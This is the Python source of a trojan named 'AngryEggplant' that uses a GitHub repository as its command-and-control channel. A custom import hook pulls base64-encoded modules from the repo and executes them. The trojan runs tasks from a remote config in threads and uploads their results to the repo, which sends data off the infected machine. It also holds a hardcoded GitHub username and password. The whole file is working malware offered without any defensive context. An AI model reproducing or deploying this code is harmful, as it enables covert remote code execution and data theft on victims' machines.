#!/usr/bin/env python
# -*- coding: utf-8 -*-

import os, sys
from github import Github
from base64 import b64encode, b64decode
from json import loads
from time import sleep
from imp import new_module
from random import randint
from threading import Thread
from Queue import Queue

trojan_id = "AngryEggplant"

trojan_config = "%s.json" % trojan_id
data_path     = "data/%s/" % trojan_id
trojan_modules= []

task_queue    = Queue()
configured    = False

class GitImporter(object):
    def __init__(self):
        self.current_module_code = ""

    def find_module(self,fullname,path=None):
        if configured:
            print "[*] Attempting to retrieve %s" % fullname
            new_library = get_file_contents("modules/%s" % fullname)

            if new_library is not None:
                self.current_module_code = b64decode(new_library)
                return self
        return None

    def load_module(self,name):
        module = new_module(name)
        exec self.current_module_code in module.__dict__
        sys.modules[name] = module
        return module



def connect_to_github():
    gh = Github("colental","Vega6812!")
    repo = gh.get_repo("AngryEggplant")
    branch = repo.get_branch("mmodules")
    return gh,repo,branch

def get_file_contents(filepath):
    gh,repo,branch = connect_to_github()
    tree = branch.commit.commit.tree.recurse()
    for filename in tree.tree:
        if filepath in filename.path:
            print "[*] Found file %s" % filepath
            blob = repo.blob(filename._json_data['sha'])
            return blob.content
    return None

def get_trojan_config():
    global configured
    config_json   = get_file_contents(trojan_config)
    config        = loads(b64decode(config_json))
    configured    = True
    for task in config:
        if task['module'] not in sys.modules:
            exec("import %s" % task['module'])
    return config

def store_module_result(data):
    gh,repo,branch = connect_to_github()
    remote_path = "data/%s/%d.data" % (trojan_id,randint(1000,100000))
    repo.create_file(remote_path,"Commit message",b64encode(data))
    return

def module_runner(module):
    task_queue.put(1)
    result = sys.modules[module].run()
    task_queue.get()
    store_module_result(result)
    return

def main():
    global task_queue
    while True:
        if task_queue.empty():
            config = get_trojan_config()
            for task in config:
                t = Thread(target=module_runner,args=(task['module'],))
                t.start()
                sleep(randint(1,10))
        sleep(randint(1000,10000))

if __name__ == '__main__':
    sys.meta_path = [GitImporter()]
    main()
